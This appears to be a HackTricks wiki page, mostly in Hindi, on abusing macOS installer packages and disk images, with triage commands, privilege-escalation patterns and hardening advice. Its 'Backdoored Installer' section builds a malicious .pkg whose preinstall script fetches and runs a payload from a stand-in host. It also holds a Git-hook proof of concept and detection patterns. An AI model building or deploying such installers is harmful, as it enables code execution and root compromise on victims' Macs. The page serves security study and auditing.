# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

macOS का **installer package** (जिसे `.pkg` file भी कहा जाता है) macOS द्वारा **software distribute** करने के लिए उपयोग किया जाने वाला file format है। ये files एक **box की तरह होती हैं जिसमें software को सही तरीके से install और run करने के लिए आवश्यक सभी चीज़ें** होती हैं।

Package file स्वयं एक archive होती है, जिसमें **target computer पर install की जाने वाली files और directories की hierarchy** होती है। इसमें installation से पहले और बाद में tasks करने के लिए **scripts** भी शामिल हो सकती हैं, जैसे configuration files सेट करना या software के पुराने versions को साफ़ करना।

### Package Structure

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) और script/installation checks
- **PackageInfo (xml)**: Info, install requirements, install location, run की जाने वाली scripts के paths
- **Bill of materials (bom)**: File permissions के साथ install, update या remove की जाने वाली files की list
- **Payload (CPIO archive gzip compressed)**: PackageInfo के `install-location` में install की जाने वाली files
- **Scripts (CPIO archive gzip compressed)**: Pre और post install scripts तथा execution के लिए temp directory में extract किए जाने वाले अन्य resources।

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Installer की सामग्री को manually decompress किए बिना देखने के लिए आप free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) का भी उपयोग कर सकते हैं।

### Static triage shortcuts

यदि लक्ष्य analysis है, तो पहले package को `Installer.app` से खोलने से **बचने का प्रयास करें**। कुछ packages Installer द्वारा खोले जाते ही code execute कर सकते हैं (उदाहरण के लिए `system.run()` या installer plug-ins के माध्यम से), इसलिए offline extraction आमतौर पर अधिक सुरक्षित शुरुआती विकल्प होता है।
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG की बुनियादी जानकारी

DMG files, या Apple Disk Images, Apple के macOS द्वारा disk images के लिए उपयोग किया जाने वाला file format है। DMG file मूल रूप से एक **mountable disk image** होती है (इसमें अपना filesystem होता है), जिसमें आमतौर पर compressed और कभी-कभी encrypted raw block data होता है। जब आप कोई DMG file खोलते हैं, तो macOS उसे **ऐसे mount करता है जैसे वह कोई physical disk हो**, जिससे आप उसकी contents तक access कर सकते हैं।

> [!CAUTION]
> ध्यान दें कि **`.dmg`** installers **बहुत से formats** support करते हैं और अतीत में vulnerabilities वाली कुछ files का abuse करके **kernel code execution** प्राप्त किया गया है।

### Disk Image Structure

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG file की hierarchy उसकी content के आधार पर अलग हो सकती है। हालांकि, application DMGs के लिए यह आमतौर पर इस structure का पालन करती है:

- Top Level: यह disk image का root होता है। इसमें अक्सर application और संभवतः Applications folder का link होता है।
- Application (.app): यह वास्तविक application होती है। macOS में, application आमतौर पर एक package होती है जिसमें application बनाने वाली कई individual files और folders होते हैं।
- Applications Link: यह macOS में Applications folder का shortcut होता है। इसका उद्देश्य application को install करना आसान बनाना है। आप app install करने के लिए `.app` file को इस shortcut पर drag कर सकते हैं।

## Privesc via pkg abuse

### Public directories से execution

यदि कोई pre- या post-installation script **`/var/tmp/Installerutil`** जैसी file को execute करती है और attacker उस file को replace कर सकता है, तो installer द्वारा उसे invoke किए जाने पर attacker privileges escalate कर सकता है। उद्धृत talks और walkthrough इस insecure external-script pattern के variants दिखाते हैं।<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

यह एक [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) है जिसे कई installers और updaters **किसी चीज़ को root के रूप में execute** करने के लिए call करते हैं। यह function parameter के रूप में **execute** की जाने वाली **file** का **path** स्वीकार करता है। हालांकि, यदि कोई attacker इस file को **modify** कर सके, तो वह privileges **escalate** करने के लिए root के साथ इसके execution का **abuse** कर सकेगा।
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
अधिक जानकारी के लिए यह talk देखें: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment और shebang abuse

Modern PackageKit bugs ने दिखाया कि installer scripts अक्सर **trusted root code** के रूप में execute होती हैं, जबकि attacker-controlled context अभी भी पास में बना रहता है। Vendor packages का audit करते समय इन पर विशेष ध्यान दें:

- Shell interpreters जैसे `#!/bin/zsh` / `#!/bin/bash`
- `sudo -u $USER`, `launchctl asuser` जैसे calls, या ऐसा कोई भी logic जो `$USER`, `$HOME`, `PATH`, `TMPDIR` या relative paths पर भरोसा करता हो
- Non-shell interpreters, जो user-controlled init files या libraries load कर सकते हैं
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug (`~/.zshenv` / `~/.bash*` inheritance during user-initiated installs) के लिए [generic macOS privesc page](../macos-privilege-escalation.md) देखें। यदि package **Apple-signed** है, तो यही script bug **SIP/TCC-relevant** बन सकता है, क्योंकि `system_installd` के पास `com.apple.rootless.install.heritable` हो सकता है; [SIP page](../macos-security-protections/macos-sip.md) देखें।<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Stateful inputs और implicit callbacks

Review को केवल स्पष्ट command injection तक सीमित न रखें। कोई root `preinstall`/`postinstall` तब trust boundary पार कर सकता है, जब वह installation से पहले मौजूद **state** का उपयोग करता हो: `/tmp` या `/var/tmp` में predictable files, पहले से मौजूद user-writable installation tree, configuration files, repository metadata, या बाद में `chown` को दिया जाने वाला username।<sup>[[9]](#references)[[10]](#references)</sup>

हाल की दो Homebrew installer flaws पुनः उपयोग किए जा सकने वाले variants दिखाती हैं:

- **Attacker-selected ownership:** package-user override को predictable `/var/tmp/.homebrew_pkg_user.plist` से पढ़ा गया, लेकिन उसके owner, mode, ACLs, symlink state या provenance को validate नहीं किया गया। Low-privileged user अपना account चुन सकता था और बाद का root `postinstall`, Homebrew tree तथा cache का ownership recursively उसे transfer कर देता था। यह privilege-assignment flaw था, shell injection नहीं।<sup>[[9]](#references)</sup>
- **Existing tree से tool callbacks:** root `postinstall` ने ऐसे installation के अंदर `git checkout` चलाया, जिसे जानबूझकर उसके normal user द्वारा writable रखा गया था। इसलिए executable `.git/hooks/post-checkout` रखने से बाद का GUI/MDM package upgrade root code execution में बदल गया। Intel path पर packaged `.git` directory को existing repository में merge करने से attacker-added hooks भी सुरक्षित रहे।<sup>[[10]](#references)</sup>

दूसरे primitive को authorized test के दौरान आसानी से model किया जा सकता है; trigger केवल तब होता है, जब vulnerable privileged installer बाद में hook-capable Git operation चलाता है।<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
नेस्टेड packages का विस्तार करें और प्रत्येक attacker-controlled source को एक privileged sink से map करें। Direct execution के अलावा, parsers, ownership changes और plug-in/hook mechanisms वाले tools को भी खोजें।<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Hardening के लिए, privileged inputs को root-owned staging directory में ले जाएँ और प्रत्येक path को उपयोग से ठीक पहले validate करें (regular file, अपेक्षित owner/mode, कोई unsafe ACL नहीं, और कोई symlink traversal नहीं)। किसी untrusted identity से ownership को recursively बदलने से बचें। जब Git को पहले से मौजूद tree पर चलाना आवश्यक हो, तो callbacks को स्पष्ट रूप से suppress करें (उदाहरण के लिए, `git -c core.hooksPath=/dev/null ...`) या Git को invoke करने से पहले repository metadata को atomically replace करें।<sup>[[9]](#references)[[10]](#references)</sup>

### Mounting द्वारा Execution

यदि कोई installer `/tmp/fixedname/bla/bla` में लिखता है, तो `/tmp/fixedname` पर noowners के साथ **mount बनाना** संभव है, जिससे आप **installation के दौरान किसी भी file को modify** करके installation process का abuse कर सकते हैं।

इसका एक उदाहरण **CVE-2021-26089** है, जिसमें **एक periodic script को overwrite** करके root के रूप में execution प्राप्त किया गया। अधिक जानकारी के लिए यह talk देखें: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg as malware

### Empty Payload

केवल **`.pkg`** file बनाना संभव है, जिसमें scripts के अंदर मौजूद malware के अलावा कोई वास्तविक payload न हो और **pre तथा post-install scripts** शामिल हों।<sup>[[2]](#references)</sup>

### JS in Distribution xml

Package की **distribution xml** file में **`<script>`** tags जोड़ना संभव है। उस code को execute किया जाएगा और यह **`system.run`** का उपयोग करके **commands execute** कर सकता है:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution packages में यह आमतौर पर top-level `Distribution` file द्वारा external scripts enable करने पर निर्भर करता है, उदाहरण के लिए `allow-external-scripts="true"` के साथ। इसलिए केवल `preinstall` / `postinstall` की समीक्षा पर्याप्त नहीं है: **Distribution XML स्वयं** `installation-check` / `volume-check` hooks और direct `system.run()` / `system.runOnce()` execution paths contain कर सकता है।
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

dist.xml के अंदर script और JS code का उपयोग करने वाला malicious installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Pkgs को Unpack करना: Macos Installer Packages के अंदर एक नज़र और सामान्य Security Flaws](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "macOS Installers की Wild World" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Pkgs को Unpack करना: MacOS Installer Packages के अंदर एक नज़र](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Installer Packages का Exploitation](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple-signed Packages के साथ SIP को तोड़ना](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Bugs का Mount(ain)" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS पर 1000 Installers से Death और सब कुछ टूटा हुआ है!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Homebrew macOS installer user-controlled package-user plist पर भरोसा करता है](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [macOS PKG postinstall में Git hooks के ज़रिए Root code execution](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
